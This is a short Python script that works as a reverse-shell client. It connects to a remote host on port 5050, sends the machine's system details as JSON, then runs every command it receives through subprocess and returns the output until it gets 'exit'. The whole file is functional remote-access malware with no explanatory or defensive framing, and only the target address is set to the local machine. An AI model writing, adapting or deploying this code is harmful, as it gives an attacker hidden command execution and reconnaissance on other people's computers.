import os
import socket
import subprocess
import psutil
import platform
import json

PORT = 5050
# HOST = '192.168.43.33'
HOST = socket.gethostbyname(socket.gethostname())
ADDR = (HOST, PORT)
FORMAT = 'utf-8'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def sys_info():

    uname = platform.uname()

    sys_info = {
        'System': uname.system,
        'Node Name': uname.node,
        'Release': uname.release,
        'Version': uname.version,
        'Machine': uname.machine,
        'Processor': uname.processor
    }

    sysData = json.dumps(sys_info).encode(FORMAT)
    client.send(sysData)

sys_info()

while True:
    command = client.recv(20480).decode()
    if command.lower() == 'exit':
        break
    
    output = subprocess.getoutput(command)
    client.send(output.encode())


client.close()